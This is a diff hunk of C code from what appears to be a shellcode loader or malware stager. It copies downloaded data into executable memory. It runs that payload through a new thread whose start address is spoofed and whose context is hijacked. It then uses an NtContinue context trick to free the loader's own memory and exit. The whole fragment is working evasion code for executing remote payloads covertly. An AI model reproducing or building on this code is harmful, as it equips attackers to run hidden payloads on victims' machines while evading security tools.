@@ -138,9 +138,34 @@ VOID Main(
 
     xMemcpy(pAllocatedAddr, pDownloadedData, dwDownloadedDataSize);
 
+	Inst->Win32.LocalFree(pDownloadedData); 
+
     NTCALL(NtProtectVirtualMemory, (HANDLE)-1, &pAllocatedAddr, &stAllocSize, PAGE_EXECUTE_READ, &ulOldProtect);
 
-    ((EXEC_MEM)pAllocatedAddr)();
+	HANDLE hThread = NULL;
+	NTCALL(NtCreateThreadEx, &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess, (U_PTR(Inst->Win32.RtlUserThreadStart) + 0x21), (void*)NULL, (void*)TRUE, (void*)0, (void*)0, (void*)0, (void*)NULL ) ;
+
+	CONTEXT ctx = { 0 };
+	ctx.ContextFlags = CONTEXT_ALL;
+
+	NTCALL(NtGetContextThread, hThread, &ctx);
+	ctx.Rip = pAllocatedAddr;
+	NTCALL(NtSetContextThread, hThread, &ctx);
+	NTCALL(NtResumeThread, hThread, NULL);
+
+	CONTEXT ctxRop = { 0 };
+	ctxRop.ContextFlags = CONTEXT_ALL;
+
+	Inst->Win32.RtlCaptureContext(&ctxRop);
+
+	ctxRop.Rip = Inst->Win32.VirtualFree;
+	ctxRop.Rcx = Inst->Info.pStartAddr;
+	ctxRop.Rdx = 0;
+	ctxRop.R8 = MEM_DECOMMIT;
+	DEREF(ctxRop.Rsp) = Inst->Win32.RtlExitUserThread;
+
+	ctxRop.ContextFlags = CONTEXT_ALL;
+	NTCALL(NtContinue, &ctxRop, FALSE);
 
     return;
 }
